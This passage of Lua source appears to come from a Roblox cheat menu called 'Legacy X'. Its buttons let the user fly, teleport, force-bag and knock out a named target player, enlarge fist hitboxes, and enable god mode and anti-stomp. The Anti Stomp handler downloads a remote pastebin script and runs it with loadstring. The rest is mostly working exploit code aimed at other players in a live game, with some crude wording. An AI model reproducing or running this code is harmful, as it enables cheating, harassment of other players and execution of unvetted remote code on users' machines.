							gyro.cframe = workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(math.rad(speed*0),0,0)
						else
							gyro.cframe = workspace.CurrentCamera.CoordinateFrame
						end
					until flying == false
					if gyro then gyro:Destroy() end
					if pos then pos:Destroy() end
					flying=false
					localplayer.Character.Humanoid.PlatformStand=false
					speed=50
				end
				e1=mouse.KeyDown:connect(function(key)
					if not torso or not torso.Parent then flying=false e1:disconnect() e2:disconnect() return end
					if key=="w" then
						keys.w=true
					elseif key=="s" then
						keys.s=true
					elseif key=="a" then
						keys.a=true
					elseif key=="d" then
						keys.d=true
					elseif key=="x" then
						if flying==true then
							flying=false
						else
							flying=true
							start()
						end
					end
				end)
				e2=mouse.KeyUp:connect(function(key)
					if key=="w" then
						keys.w=false
					elseif key=="s" then
						keys.s=false
					elseif key=="a" then
						keys.a=false
					elseif key=="d" then
						keys.d=false
					end
				end)
				start() 																		
			end)

			Bag.Name = "Bag"
			Bag.Parent = ScrollingFrame
			Bag.BackgroundColor3 = Color3.fromRGB(255, 0, 68)
			Bag.BorderSizePixel = 0
			Bag.Position = UDim2.new(0.109376982, 0, 0.238463193, 0)
			Bag.Size = UDim2.new(0, 216, 0, 29)
			Bag.Font = Enum.Font.Cartoon
			Bag.Text = "Bag"
			Bag.TextColor3 = Color3.fromRGB(255, 255, 255)
			Bag.TextScaled = true
			Bag.TextSize = 14.000
			Bag.TextWrapped = true

			UICorner_3.CornerRadius = UDim.new(0.25, 0)
			UICorner_3.Parent = Bag
			Bag.MouseButton1Click:connect(function()
				local TargetPlr = TextBox.Text
				function getRoot(char)
					local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
					return rootPart
				end

				if TargetPlr and game.Players[TargetPlr].Character.BodyEffects['K.O'].Value == false then
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Workspace.Ignored.Shop['[BrownBag] - $25'].Head.CFrame
					wait(.30)
					fireclickdetector(game.Workspace.Ignored.Shop['[BrownBag] - $25'].ClickDetector)
					game.Players.LocalPlayer.Backpack:WaitForChild("[BrownBag]").Parent = game.Players.LocalPlayer.Character

					local A_1 = "[Legacy X] Attempting To Bag " .. TargetPlr .. "." local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
					wait(.5)
					repeat
						pcall(function()
							wait()
							getRoot(game.Players[TargetPlr].Character).CFrame = getRoot(game.Players.LocalPlayer.Character).CFrame + Vector3.new(1,3,0)
							game.Players.LocalPlayer.Character["[BrownBag]"]:Activate()
						end)
					until game.Players[TargetPlr].Character:FindFirstChild("Christmas_Sock")
					local A_1 = "[Legacy X] Successfully Bagged " .. TargetPlr .. "." local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
				elseif game.Players[TargetPlr].Character.BodyEffects['K.O'].Value == false then
					local A_1 = "[Legacy X] " .. TargetPlr .. " Is Already Bagged." local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
				end
			end)

			Target.Name = "Target"
			Target.Parent = ScrollingFrame
			Target.BackgroundColor3 = Color3.fromRGB(255, 0, 68)
			Target.BorderSizePixel = 0
			Target.Position = UDim2.new(0.109376982, 0, 0.275419772, 0)
			Target.Size = UDim2.new(0, 216, 0, 29)
			Target.Font = Enum.Font.Cartoon
			Target.Text = "Target"
			Target.TextColor3 = Color3.fromRGB(255, 255, 255)
			Target.TextScaled = true
			Target.TextSize = 14.000
			Target.TextWrapped = true

			UICorner_4.CornerRadius = UDim.new(0.25, 0)
			UICorner_4.Parent = Target
			Target.MouseButton1Click:connect(function()
				local localPlayer     = game:GetService("Players").LocalPlayer;
				local localCharacter  = localPlayer.Character;
				local TargetPlr       = TextBox.Text;
				wait(0) local A_1 = "[Legacy X] " .. TargetPlr .. "Has Been Locked." local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)


				if TargetPlr and game.Players[TargetPlr].Character.BodyEffects['K.O'].Value == false then
					pcall(function()

						game.Players.LocalPlayer.Character.LeftHand.Size = Vector3.new(4,4,4)
						localCharacter.LeftHand.LeftWrist:Destroy();
						localCharacter.RightHand.RightWrist:Destroy();
						game.Players.LocalPlayer.Character.RightHand.Size = Vector3.new(4,4,4)

					end);
					repeat
						wait();
						localCharacter.LeftHand.CFrame = game.Players[TargetPlr].Character.LowerTorso.CFrame;
						localCharacter.RightHand.CFrame = game.Players[TargetPlr].Character.LowerTorso.CFrame;
					until game.Players[TargetPlr].Character.BodyEffects['K.O'].Value == true
					wait(0) local A_1 = "[Legacy X] " .. TargetPlr .. " Has Been Successfully Eliminated!" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
					game.StarterGui:SetCore("SendNotification", {
						Title = "Legacy X [Target System]";
						Text = "[Legacy X] " .. TargetPlr .. " Has been successfully knocked!";
						Duration = 15;
					})
				elseif game.Players[TargetPlr].Character.BodyEffects['K.O'].Value == true then
					wait(0) local A_1 = "[Legacy X] " .. TargetPlr .. " Is Already Eliminated." local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
					game.StarterGui:SetCore("SendNotification", {
						Title = "Legacy X [TARGET SYSTEM]";
						Text = "[Legacy X] " .. TargetPlr .. " Is already knocked.";
						Duration = 15;
					})
				end;
			end);

			FreeFists.Name = "Free Fists"
			FreeFists.Parent = ScrollingFrame
			FreeFists.BackgroundColor3 = Color3.fromRGB(255, 0, 68)
			FreeFists.BorderSizePixel = 0
			FreeFists.Position = UDim2.new(0.109376982, 0, 0.198898003, 0)
			FreeFists.Size = UDim2.new(0, 216, 0, 29)
			FreeFists.Font = Enum.Font.Cartoon
			FreeFists.Text = "Free Fists"
			FreeFists.TextColor3 = Color3.fromRGB(255, 255, 255)
			FreeFists.TextScaled = true
			FreeFists.TextSize = 14.000
			FreeFists.TextWrapped = true

			UICorner_5.CornerRadius = UDim.new(0.25, 0)
			UICorner_5.Parent = FreeFists
			FreeFists.MouseButton1Down:connect(function()
				wait(0) local A_1 = "[Legacy X] FreeFists Switched To True." local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 


				local Players = game:GetService("Players")
				local RunService = game:GetService("RunService")

				local LocalPlayer = Players.LocalPlayer
				local Mouse = LocalPlayer:GetMouse()

				local Character = LocalPlayer.Character
				local RightHand = Character.RightHand
				local Character = LocalPlayer.Character
				local LeftHand = Character.LeftHand

				wait(3)

				local Box = Instance.new("SelectionBox")
				Box.LineThickness = 0.15
				Box.Color3 = Color3.new(0, 1, 0.0313725)
				Box.Adornee = RightHand
				Box.Parent = RightHand

				LeftHand.LeftWrist:Destroy() 

				local Box = Instance.new("SelectionBox")
				Box.LineThickness = 0.15
				Box.Color3 = Color3.new(0.215686, 1, 0)
				Box.Adornee = LeftHand
				Box.Parent = LeftHand

				RightHand.RightWrist:Destroy() 

				while true do 
					pcall(function()
						RightHand.Position = Mouse.Hit.p
						RightHand.Rotation = Vector3.new(0,0,0)
						RightHand.Massless = true
						LeftHand.Position = Mouse.Hit.p
						LeftHand.Rotation = Vector3.new(0,0,0)
						LeftHand.Massless = true
					end)
					pcall(function()
						local Tool = Character:FindFirstChildOfClass("Tool")
						Tool.Handle.Position = RightHand.Position
						Tool.Handle.Position = LeftHand.Position
					end)
					RunService.RenderStepped:Wait()
				end
			end)

			AntiStomp.Name = "Anti Stomp"
			AntiStomp.Parent = ScrollingFrame
			AntiStomp.BackgroundColor3 = Color3.fromRGB(255, 0, 68)
			AntiStomp.BorderSizePixel = 0
			AntiStomp.Position = UDim2.new(0.109376982, 0, 0.162810996, 0)
			AntiStomp.Size = UDim2.new(0, 216, 0, 29)
			AntiStomp.Font = Enum.Font.Cartoon
			AntiStomp.Text = "Anti Stomp"
			AntiStomp.TextColor3 = Color3.fromRGB(255, 255, 255)
			AntiStomp.TextScaled = true
			AntiStomp.TextSize = 14.000
			AntiStomp.TextWrapped = true

			UICorner_6.CornerRadius = UDim.new(0.25, 0)
			UICorner_6.Parent = AntiStomp
			AntiStomp.MouseButton1Down:connect(function()
				wait(0) local A_1 = "[Legacy X] Anti-Stomp Enabled" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 

				game.StarterGui:SetCore("SendNotification", {
					Title = "Legacy X";
					Text = "Anti stomp enabled."
				})
				pcall(function() if tostring(game.PlaceId) == "2788229376" then local corepackages = game:GetService"CorePackages" local localplayer = game:GetService"Players".LocalPlayer local run = game:GetService"RunService" run:BindToRenderStep("rrrrrrrrrrr",2000,function() pcall(function() if localplayer.Character.Humanoid.Health <= 30 then localplayer.Character.Humanoid:UnequipTools() localplayer.Character.Humanoid:Destroy() workspace.CurrentCamera.CameraSubject = localplayer.Character wait() local prt = Instance.new("Model", corepackages); Instance.new("Part", prt).Name="Torso"; Instance.new("Part", prt).Name="Head"; Instance.new("Humanoid", prt).Name="Humanoid"; localplayer.Character=prt end end) pcall(function() if localplayer.Character.Humanoid.FloorMaterial == "Plastic" then ReplicatedStorage:FireServer("Stomp") end end) end) loadstring(game:HttpGet("https://pastebin.com/raw/MQ3wc7Zq", true))() end end)
			end)

			AntiFlashbang.Name = "AntiFlashbang"
			AntiFlashbang.Parent = ScrollingFrame
			AntiFlashbang.BackgroundColor3 = Color3.fromRGB(255, 0, 68)
			AntiFlashbang.BorderSizePixel = 0
			AntiFlashbang.Position = UDim2.new(0.109376982, 0, 0.124984942, 0)
			AntiFlashbang.Size = UDim2.new(0, 216, 0, 29)
			AntiFlashbang.Font = Enum.Font.Cartoon
			AntiFlashbang.Text = "Anti Flash-Bang"
			AntiFlashbang.TextColor3 = Color3.fromRGB(255, 255, 255)
			AntiFlashbang.TextScaled = true
			AntiFlashbang.TextSize = 14.000
			AntiFlashbang.TextWrapped = true

			UICorner_7.CornerRadius = UDim.new(0.25, 0)
			UICorner_7.Parent = AntiFlashbang
			AntiFlashbang.MouseButton1Down:connect(function()
				wait(0) local A_1 = "[Legacy X] Anti-Flashbang Enabled" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 

				while true do
					local XD = game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui

					if XD:FindFirstChild("whiteScreen") then
						XD.whiteScreen:Destroy()
					end
					wait(0.2)
				end										
			end)

			AntiBag.Name = "Anti Bag"
			AntiBag.Parent = ScrollingFrame
			AntiBag.BackgroundColor3 = Color3.fromRGB(255, 0, 68)
			AntiBag.BorderSizePixel = 0
			AntiBag.Position = UDim2.new(0.109376982, 0, 0.0880284235, 0)
			AntiBag.Size = UDim2.new(0, 216, 0, 29)
			AntiBag.Font = Enum.Font.Cartoon
			AntiBag.Text = "Anti Bag"
			AntiBag.TextColor3 = Color3.fromRGB(255, 255, 255)
			AntiBag.TextScaled = true
			AntiBag.TextSize = 14.000
			AntiBag.TextWrapped = true

			UICorner_8.CornerRadius = UDim.new(0.25, 0)
			UICorner_8.Parent = AntiBag
			AntiBag.MouseButton1Down:connect(function()
				wait(0) local A_1 = "[Legacy X] Anti-Bag Enabled" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
				local LocalPlayer = game:GetService("Players").LocalPlayer
				local char = LocalPlayer.Character
				char.ChildAdded:Connect(function(sock)
					if sock:IsA("MeshPart") then do
							wait(0)
							sock:Destroy()
						end
					end
				end)
			end)

			Headless.Name = "Headless"
			Headless.Parent = ScrollingFrame
			Headless.BackgroundColor3 = Color3.fromRGB(255, 0, 68)
			Headless.BorderSizePixel = 0
			Headless.Position = UDim2.new(0.109376982, 0, 0.0510719046, 0)
			Headless.Size = UDim2.new(0, 216, 0, 29)
			Headless.Font = Enum.Font.Cartoon
			Headless.Text = "Headless"
			Headless.TextColor3 = Color3.fromRGB(255, 255, 255)
			Headless.TextScaled = true
			Headless.TextSize = 14.000
			Headless.TextWrapped = true

			UICorner_9.CornerRadius = UDim.new(0.25, 0)
			UICorner_9.Parent = Headless
			Headless.MouseButton1Down:connect(function()
				game.StarterGui:SetCore("SendNotification", {
					Title = "Legacy X";
					Text = "Headles Enabled. no one can see ur face or ur head."
				})

				pcall(function()
					game.Players.LocalPlayer.Character.Head.Neck:Destroy()
					game.Players.LocalPlayer.Character.UpperTorso.NeckAttachment:Destroy()
					game.Players.LocalPlayer.Character.Humanoid.HealthDisplayDistance = math.huge
					game.Players.LocalPlayer.Character.Humanoid.NameDisplayDistance = math.huge
					game.Players.LocalPlayer.Character.Head.Size = Vector3.new(0,0,0)
					game.Players.LocalPlayer.Character.Head.Massless = true
					game.Players.LocalPlayer.Character.Head.CanCollide = false

					heazd = true

					while heazd == true do 
						pcall(function()  
							game.Players.LocalPlayer.Character.Head.NeckRigAttachment.CFrame =  CFrame.new(0, 100000.4736328125, 0)
							game.Players.LocalPlayer.Character.UpperTorso.NeckRigAttachment.CFrame =  CFrame.new(0, 100000.4736328125, 0)
							game.Players.LocalPlayer.Character.Head.CFrame = CFrame.new(0, 100000.4736328125, 0)
						end)
						wait()
					end
				end)
			end)

			Goto.Name = "Goto"
			Goto.Parent = ScrollingFrame
			Goto.BackgroundColor3 = Color3.fromRGB(255, 0, 68)
			Goto.BorderSizePixel = 0
			Goto.Position = UDim2.new(0.109376982, 0, 0.311941445, 0)
			Goto.Size = UDim2.new(0, 216, 0, 29)
			Goto.Font = Enum.Font.Cartoon
			Goto.Text = "Goto"
			Goto.TextColor3 = Color3.fromRGB(255, 255, 255)
			Goto.TextScaled = true
			Goto.TextSize = 14.000
			Goto.TextWrapped = true

			UICorner_10.CornerRadius = UDim.new(0.25, 0)
			UICorner_10.Parent = Goto
			Goto.MouseButton1Click:connect(function()
				local TargetPlr = TextBox.Text;
				local A_1 = "[Legacy X] Teleporting To " .. TargetPlr .. "." local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
				wait(.30)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[TargetPlr].Character.HumanoidRootPart.CFrame
			end)

			Spectate.Name = "Spectate"
			Spectate.Parent = ScrollingFrame
			Spectate.BackgroundColor3 = Color3.fromRGB(255, 0, 68)
			Spectate.BorderSizePixel = 0
			Spectate.Position = UDim2.new(0.109376982, 0, 0.348897994, 0)
			Spectate.Size = UDim2.new(0, 216, 0, 29)
			Spectate.Font = Enum.Font.Cartoon
			Spectate.Text = "Spectate"
			Spectate.TextColor3 = Color3.fromRGB(255, 255, 255)
			Spectate.TextScaled = true
			Spectate.TextSize = 14.000
			Spectate.TextWrapped = true

			UICorner_11.CornerRadius = UDim.new(0.25, 0)
			UICorner_11.Parent = Spectate
			Spectate.MouseButton1Click:connect(function()
				local TargetPlr = TextBox.Text;
				game.Workspace.Camera.CameraSubject = game.Players[TargetPlr].Character.Humanoid;
				local A_1 = "[Legacy X] Spectating " .. TargetPlr .. "." local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
			end)

			Unspectate.Name = "Unspectate"
			Unspectate.Parent = ScrollingFrame
			Unspectate.BackgroundColor3 = Color3.fromRGB(255, 0, 68)
			Unspectate.BorderSizePixel = 0
			Unspectate.Position = UDim2.new(0.109376982, 0, 0.385854483, 0)
			Unspectate.Size = UDim2.new(0, 216, 0, 29)
			Unspectate.Font = Enum.Font.Cartoon
			Unspectate.Text = "Unspectate"
			Unspectate.TextColor3 = Color3.fromRGB(255, 255, 255)
			Unspectate.TextScaled = true
			Unspectate.TextSize = 14.000
			Unspectate.TextWrapped = true

			UICorner_12.CornerRadius = UDim.new(0.25, 0)
			UICorner_12.Parent = Unspectate
			Unspectate.MouseButton1Click:connect(function()
				local TargetPlr = TextBox.Text;
				local A_1 = "[Legacy X] Stopped Spectating " .. TargetPlr .. "." local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
				game.Workspace.Camera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
			end)

			Cash.Name = "Cash"
			Cash.Parent = ScrollingFrame
			Cash.BackgroundColor3 = Color3.fromRGB(255, 0, 68)
			Cash.BorderSizePixel = 0
			Cash.Position = UDim2.new(0.109376982, 0, 0.423680574, 0)
			Cash.Size = UDim2.new(0, 216, 0, 29)
			Cash.Font = Enum.Font.Cartoon
			Cash.Text = "Cash"
			Cash.TextColor3 = Color3.fromRGB(255, 255, 255)
			Cash.TextScaled = true
			Cash.TextSize = 14.000
			Cash.TextWrapped = true

			UICorner_13.CornerRadius = UDim.new(0.25, 0)
			UICorner_13.Parent = Cash
			Cash.MouseButton1Click:connect(function()
				local TargetPlr = TextBox.Text;
				local A_1 = "[Legacy X] " .. TargetPlr .. " Has $" .. game.Players[TargetPlr].DataFolder.Currency.Value .. "." local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
			end)

			FistReach.Name = "Fist Reach"
			FistReach.Parent = ScrollingFrame
			FistReach.BackgroundColor3 = Color3.fromRGB(255, 0, 68)
			FistReach.BorderSizePixel = 0
			FistReach.Position = UDim2.new(0.109376982, 0, 0.462810993, 0)
			FistReach.Size = UDim2.new(0, 216, 0, 29)
			FistReach.Font = Enum.Font.Cartoon
			FistReach.Text = "Fist Reach"
			FistReach.TextColor3 = Color3.fromRGB(255, 255, 255)
			FistReach.TextScaled = true
			FistReach.TextSize = 14.000
			FistReach.TextWrapped = true

			UICorner_14.CornerRadius = UDim.new(0.25, 0)
			UICorner_14.Parent = FistReach
			FistReach.MouseButton1Down:connect(function()
				game.StarterGui:SetCore("SendNotification", {
					Title = "Legacy X";
					Text = "Melee Reach Enabled."
				})
				LP = game.Players.LocalPlayer 

				for i,v in ipairs(LP.Character:GetDescendants()) do 

					if v:IsA("MeshPart") then v.Massless = true 

						v.CanCollide = false 

						v.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0) 


					end 

				end 


				for i,v in ipairs(game.workspace:GetDescendants()) do 

					if v:IsA("Seat") then 

						v.Disabled = true 

					end 

				end 

				x = 45

				y = 45 

				z = 45



				penis = Vector3.new(x,y,z) 


				LP.Character.RightHand.Size = penis 


				local selectionBox = Instance.new("SelectionBox",LP.Character.RightHand) 

				selectionBox.Adornee = LP.Character.RightHand 
				selectionBox = Enum.Material.Neon
				selectionBox.Color3 = Color3.new(1, 1, 1)  

				LP.Character.LeftHand.Size = penis 

				LP.Character.BodyEffects.SpecialParts.LeftHand.Size = penis 



				local selectionBox = Instance.new("SelectionBox",LP.Character.LeftHand) 

				selectionBox.Adornee = LP.Character.LeftHand 
				selectionBox = Enum.Material.Neon
				selectionBox.Color3 = Color3.new(1, 1, 1) 

			end)

			FEBackflip.Name = "FE Backflip"
			FEBackflip.Parent = ScrollingFrame
			FEBackflip.BackgroundColor3 = Color3.fromRGB(255, 0, 68)
			FEBackflip.BorderSizePixel = 0
			FEBackflip.Position = UDim2.new(0.109376982, 0, 0.499332726, 0)
			FEBackflip.Size = UDim2.new(0, 216, 0, 29)
			FEBackflip.Font = Enum.Font.Cartoon
			FEBackflip.Text = "Fe Backflip"
			FEBackflip.TextColor3 = Color3.fromRGB(255, 255, 255)
			FEBackflip.TextScaled = true
			FEBackflip.TextSize = 14.000
			FEBackflip.TextWrapped = true

			UICorner_15.CornerRadius = UDim.new(0.25, 0)
			UICorner_15.Parent = FEBackflip
			FEBackflip.MouseButton1Down:connect(function()
				wait(5)

				--[[ Info ]]--

				local ver = "2.00"
				local scriptname = "feFlip"


				--[[ Keybinds ]]--

				local FrontflipKey = Enum.KeyCode.Z
				local BackflipKey = Enum.KeyCode.X
				local AirjumpKey = Enum.KeyCode.C


				--[[ Dependencies ]]--

				local ca = game:GetService("ContextActionService")
				local zeezy = game:GetService("Players").LocalPlayer
				local h = 0.0174533
				local antigrav


				--[[ Functions ]]--

				function zeezyFrontflip(act,inp,obj)
					if inp == Enum.UserInputState.Begin then
						zeezy.Character.Humanoid:ChangeState("Jumping")
						wait()
						zeezy.Character.Humanoid.Sit = true
						for i = 1,360 do 
							delay(i/720,function()
								zeezy.Character.Humanoid.Sit = true
								zeezy.Character.HumanoidRootPart.CFrame = zeezy.Character.HumanoidRootPart.CFrame * CFrame.Angles(-h,0,0)
							end)
						end
						wait(0.55)
						zeezy.Character.Humanoid.Sit = false
					end
				end

				function zeezyBackflip(act,inp,obj)
					if inp == Enum.UserInputState.Begin then
						zeezy.Character.Humanoid:ChangeState("Jumping")
						wait()
						zeezy.Character.Humanoid.Sit = true
						for i = 1,360 do
							delay(i/720,function()
								zeezy.Character.Humanoid.Sit = true
								zeezy.Character.HumanoidRootPart.CFrame = zeezy.Character.HumanoidRootPart.CFrame * CFrame.Angles(h,0,0)
							end)
						end
						wait(0.55)
						zeezy.Character.Humanoid.Sit = false
					end
				end

				function zeezyAirjump(act,inp,obj)
					if inp == Enum.UserInputState.Begin then
						zeezy.Character:FindFirstChildOfClass'Humanoid':ChangeState("Seated")
						wait()
						zeezy.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")	
					end
				end


				--[[ Binds ]]--

				ca:BindAction("zeezyFrontflip",zeezyFrontflip,false,FrontflipKey)
				ca:BindAction("zeezyBackflip",zeezyBackflip,false,BackflipKey)
				ca:BindAction("zeezyAirjump",zeezyAirjump,false,AirjumpKey)

				--[[ Load Message ]]--

				local notifSound = Instance.new("Sound",workspace)
				notifSound.PlaybackSpeed = 1.5
				notifSound.Volume = 0.15
				notifSound.SoundId = "rbxassetid://170765130"
				notifSound.PlayOnRemove = true
				notifSound:Destroy()
				game.StarterGui:SetCore("SendNotification", {Title = "Legacy X", Text = "febackslip loaded successfully!", Icon = "rbxassetid://505845268", Duration = 5, Button1 = "Okay"})
			end)

			Maskspam.Name = "Maskspam"
			Maskspam.Parent = ScrollingFrame
			Maskspam.BackgroundColor3 = Color3.fromRGB(255, 0, 68)
			Maskspam.BorderSizePixel = 0
			Maskspam.Position = UDim2.new(0.109376982, 0, 0.534984887, 0)
			Maskspam.Size = UDim2.new(0, 216, 0, 29)
			Maskspam.Font = Enum.Font.Cartoon
			Maskspam.Text = "Mask Spam | Lag Reset"
			Maskspam.TextColor3 = Color3.fromRGB(255, 255, 255)
			Maskspam.TextScaled = true
			Maskspam.TextSize = 14.000
			Maskspam.TextWrapped = true

			UICorner_16.CornerRadius = UDim.new(0.25, 0)
			UICorner_16.Parent = Maskspam
			Maskspam.MouseButton1Down:connect(function()
				local notifSound = Instance.new("Sound",workspace)
				notifSound.PlaybackSpeed = 1.5
				notifSound.Volume = 0.15
				notifSound.SoundId = "rbxassetid://170765130"
				notifSound.PlayOnRemove = true
				notifSound:Destroy()
				game.StarterGui:SetCore("SendNotification", {Title = "Legacy X", Text = "Mask Spam | Health Spam [Enabled]", Icon = "rbxassetid://505845268", Duration = 5, Button1 = "Okay"})
				gsPlayers = game:GetService("Players")
				gsWorkspace = game:GetService("Workspace")
				gsLighting = game:GetService("Lighting")
				gsReplicatedStorage = game:GetService("ReplicatedStorage")
				gsCoreGui = game:GetService("CoreGui")
				gsTween = game:GetService("TweenService")
				gsHttp = game:GetService("HttpService")

				LP = gsPlayers.LocalPlayer
				Mouse = LP:GetMouse()

				LP.Character.ChildAdded:Connect(function(b)
					wait(0)
					if b:IsA("Accessory") then b.Handle.Mesh:Destroy()
						b.Parent = gsWorkspace
					end
				end)
			end)


			Naked.Name = "Naked"
			Naked.Parent = ScrollingFrame
			Naked.BackgroundColor3 = Color3.fromRGB(255, 0, 68)
			Naked.BorderSizePixel = 0
			Naked.Position = UDim2.new(0.109376982, 0, 0.570637047, 0)
			Naked.Size = UDim2.new(0, 216, 0, 29)
			Naked.Font = Enum.Font.Cartoon
			Naked.Text = "Naked"
			Naked.TextColor3 = Color3.fromRGB(255, 255, 255)
			Naked.TextScaled = true
			Naked.TextSize = 14.000
			Naked.TextWrapped = true

			UICorner_17.CornerRadius = UDim.new(0.25, 0)
			UICorner_17.Parent = Naked
			Naked.MouseButton1Down:connect(function()
				local notifSound = Instance.new("Sound",workspace)
				notifSound.PlaybackSpeed = 1.5
				notifSound.Volume = 0.15
				notifSound.SoundId = "rbxassetid://170765130"
				notifSound.PlayOnRemove = true
				notifSound:Destroy()
				game.StarterGui:SetCore("SendNotification", {Title = "Legacy X", Text = "Removing ur clothes ;))", Icon = "rbxassetid://505845268", Duration = 5, Button1 = "Okay"})
				while wait() do
					pcall(function()
						if game.Players.LocalPlayer.Character:FindFirstChild("Shirt") then
							game.Players.LocalPlayer.Character.Shirt:Destroy()
						elseif game.Players.LocalPlayer.Character:FindFirstChild("Pants") then
							game.Players.LocalPlayer.Character.Pants:Destroy()
						end
					end)
				end
			end)

			GodBullet.Name = "GodBullet"
			GodBullet.Parent = ScrollingFrame
			GodBullet.BackgroundColor3 = Color3.fromRGB(255, 0, 68)
			GodBullet.BorderSizePixel = 0
			GodBullet.Position = UDim2.new(0.109376982, 0, 0.605419636, 0)
			GodBullet.Size = UDim2.new(0, 216, 0, 29)
			GodBullet.Font = Enum.Font.Cartoon
			GodBullet.Text = "God Bullet"
			GodBullet.TextColor3 = Color3.fromRGB(255, 255, 255)
			GodBullet.TextScaled = true
			GodBullet.TextSize = 14.000
			GodBullet.TextWrapped = true

			UICorner_18.CornerRadius = UDim.new(0.25, 0)
			UICorner_18.Parent = GodBullet
			GodBullet.MouseButton1Down:connect(function()
				wait(0) local A_1 = "[Legacy X] Bulletproof Switched To True." local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 

				game.StarterGui:SetCore("SendNotification", {
					Title = "Legacy X";
					Text = "God Bullet enabled. bullets wont damage u anymore!"
				})
				local ps = game:GetService("Players")
				local lp = ps.LocalPlayer
				local char = lp.Character

				char.BodyEffects.Armor:Destroy()
				char.BodyEffects.Defense:Destroy()

				local Clone1 = Instance.new("IntValue")
				Clone1.Name = "Armor"
				Clone1.Parent = char.BodyEffects

				local Clone2 = Instance.new("NumberValue")
				Clone2.Name = "Defense"
				Clone2.Parent = char.BodyEffects
			end)

			GodmodeUnban.Name = "Godmode + Unban"
			GodmodeUnban.Parent = ScrollingFrame
			GodmodeUnban.BackgroundColor3 = Color3.fromRGB(255, 0, 68)
			GodmodeUnban.BorderSizePixel = 0
			GodmodeUnban.Position = UDim2.new(0.10576687, 0, 0.640202224, 0)
			GodmodeUnban.Size = UDim2.new(0, 216, 0, 29)
			GodmodeUnban.Font = Enum.Font.Cartoon
			GodmodeUnban.Text = "God Mode + Unban"
			GodmodeUnban.TextColor3 = Color3.fromRGB(255, 255, 255)
			GodmodeUnban.TextScaled = true
			GodmodeUnban.TextSize = 14.000
			GodmodeUnban.TextWrapped = true

			UICorner_19.CornerRadius = UDim.new(0.25, 0)
			UICorner_19.Parent = GodmodeUnban
			GodmodeUnban.MouseButton1Down:connect(function()
				wait(0) local A_1 = "[Legacy X] Godmode and Unban Enabled." local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
				local notifSound = Instance.new("Sound",workspace)
				notifSound.PlaybackSpeed = 1.5
				notifSound.Volume = 0.15
				notifSound.SoundId = "rbxassetid://170765130"
				notifSound.PlayOnRemove = true
				notifSound:Destroy()
				game.StarterGui:SetCore("SendNotification", {Title = "Legacy X", Text = "God Mode Enabled | Unban Enabled [Guns Only With God Mode]", Icon = "rbxassetid://505845268", Duration = 5, Button1 = "Okay"})
				local name = game.Players.LocalPlayer.Name
				game.Players.LocalPlayer.Character.Humanoid.Health = 0
				game.Players.LocalPlayer.Character:ClearAllChildren()
				local lol =    game.Workspace:WaitForChild(name)
				local money = Instance.new("Folder",game.Players.LocalPlayer.Character);money.Name = "FULLY_LOADED_CHAR"
				lol.Parent = game.Workspace.Players
				game.Players.LocalPlayer.Character:WaitForChild("BodyEffects")
				game.Players.LocalPlayer.Character.BodyEffects.BreakingParts:Destroy()
			end)

			FreeFistsBiggerHitbox.Name = "Free Fists Bigger Hitbox"
			FreeFistsBiggerHitbox.Parent = ScrollingFrame
			FreeFistsBiggerHitbox.BackgroundColor3 = Color3.fromRGB(255, 0, 68)
			FreeFistsBiggerHitbox.BorderSizePixel = 0
			FreeFistsBiggerHitbox.Position = UDim2.new(0.109376982, 0, 0.676723957, 0)
			FreeFistsBiggerHitbox.Size = UDim2.new(0, 216, 0, 29)
			FreeFistsBiggerHitbox.Font = Enum.Font.Cartoon
			FreeFistsBiggerHitbox.Text = "FreeFists [HitBox]"
			FreeFistsBiggerHitbox.TextColor3 = Color3.fromRGB(255, 255, 255)
			FreeFistsBiggerHitbox.TextScaled = true
			FreeFistsBiggerHitbox.TextSize = 14.000
			FreeFistsBiggerHitbox.TextWrapped = true

			UICorner_20.CornerRadius = UDim.new(0.25, 0)
			UICorner_20.Parent = FreeFistsBiggerHitbox
			FreeFistsBiggerHitbox.MouseButton1Down:connect(function()
